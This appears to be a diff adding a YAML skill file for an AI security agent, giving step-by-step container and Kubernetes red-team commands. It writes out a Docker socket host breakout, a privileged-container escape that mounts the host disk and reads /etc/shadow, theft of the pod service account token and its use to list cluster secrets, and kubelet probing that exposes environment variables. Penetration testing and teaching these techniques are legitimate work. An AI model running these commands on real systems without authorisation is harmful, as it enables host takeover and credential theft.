@@ -1,0 +1,65 @@
+schema_version: 1
+version: 3.0.0
+name: container-security
+description: Senior container and Kubernetes security assessment — Docker socket breakouts, privileged container escapes, Kubernetes RBAC auditing, and pod service account abuse.
+triggers:
+  - container
+  - docker
+  - docker escape
+  - kubernetes
+  - k8s
+  - serviceaccount
+  - kubelet
+  - rbac
+  - cgroup
+tools:
+  - curl
+  - find
+knowledge: |
+  Assess container runtimes, Kubernetes clusters, and virtualization isolation layers with senior red-team precision.
+
+  1. CONTAINER RUNTIME DETECTION & POSTURE:
+     - Confirm container execution environment:
+       `test -f /.dockerenv || grep -qE 'docker|kubepods|containerd' /proc/1/cgroup`
+     - Check container hostname and assigned IP (frequently 172.17.x.x for Docker bridge or 10.244.x.x for Kubernetes CNI).
+
+  2. DOCKER DAEMON SOCKET EXPOSURE (/var/run/docker.sock):
+     Mounting the host Docker socket inside a container provides instantaneous root escalation on the host machine:
+     - Test socket access:
+       `ls -la /var/run/docker.sock`
+       `curl -s --unix-socket /var/run/docker.sock http://localhost/version`
+     - Host Breakout Execution:
+       `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host`
+       or manually create a container via raw Docker REST API.
+
+  3. PRIVILEGED CONTAINER & LINUX CAPABILITY BREAKOUTS:
+     - Inspect container capabilities:
+       `capsh --print`
+     - The `CAP_SYS_ADMIN` Breakout:
+       If running under `--privileged` or possessing `CAP_SYS_ADMIN`, raw block devices are accessible:
+       • Identify host disks: `fdisk -l` or `ls -la /dev/sd* /dev/nvme* /dev/vd*`
+       • Mount host storage directly into container filesystem:
+         `mkdir -p /mnt/host && mount /dev/sda1 /mnt/host`
+         `cat /mnt/host/etc/shadow`
+
+  4. KUBERNETES SERVICE ACCOUNT TOKEN HARVESTING & RBAC:
+     Every Kubernetes pod typically mounts a service account token:
+     - Token Assets:
+       • Token: `/var/run/secrets/kubernetes.io/serviceaccount/token`
+       • Namespace: `/var/run/secrets/kubernetes.io/serviceaccount/namespace`
+       • Cluster CA: `/var/run/secrets/kubernetes.io/serviceaccount/ca.crt`
+     - Interrogate Kubernetes Cluster API:
+       Query cluster endpoints using the mounted service account file:
+       `curl -s -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/secrets`
+       `curl -s -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/pods`
+     - Test permissions: probe if the service account has `create pods`, `get secrets`, or `exec` rights.
+
+  5. KUBELET DIRECT API PROBING:
+     Inspect node kubelet ports if reachable across the network:
+     • Port 10255 (Read-Only): `http://<node_ip>:10255/pods` (discloses running pods, containers, and environment variables).
+     • Port 10250 (Authenticated): probe `/pods` with captured cluster tokens.
+references:
+  - persona:container-security-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/container-security.yaml
